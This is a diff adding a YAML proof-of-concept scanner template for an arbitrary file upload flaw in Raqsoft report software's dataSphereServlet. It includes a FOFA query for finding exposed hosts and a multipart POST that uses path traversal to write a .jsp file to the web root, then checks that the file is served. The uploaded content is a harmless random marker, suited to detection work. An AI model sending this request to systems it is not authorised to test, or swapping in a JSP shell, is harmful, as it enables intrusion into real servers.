@@ -1,0 +1,46 @@
+id: poc-yaml-raqsoft-datasphereservlet-anyfile-upload
+info:
+  name: 润乾报表 dataSphereServlet 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 两高一弱
+  - 文件上传
+  finger: 润乾报表
+  fofa: body="润乾报表" || body="/raqsoft"
+variables:
+  t1: random_str(4)
+  t2: base64(t1)
+requests:
+- method: POST
+  path: /servlet/dataSphereServlet?action=38
+  headers:
+    Content-Type: multipart/form-data; boundary=eac629ee4641cb0fe10596fba5e0c5d9
+  data: '--eac629ee4641cb0fe10596fba5e0c5d9
+
+    Content-Disposition: form-data; name="openGrpxFile"; filename="{{.t1}}.jsp"
+
+    Content-Type: text/plain
+
+
+    {{.t2}}
+
+    --eac629ee4641cb0fe10596fba5e0c5d9
+
+    Content-Disposition: form-data; name="path"
+
+
+    ../../../
+
+    --eac629ee4641cb0fe10596fba5e0c5d9
+
+    Content-Disposition: form-data; name="saveServer"
+
+
+    1
+
+    --eac629ee4641cb0fe10596fba5e0c5d9--'
+  expression: status_code == 200 && contains(body,"parent.openFileCallback")
+- method: GET
+  path: /{{.t1}}.jsp
+  expression: status_code == 200 && body == t2
+transport: http
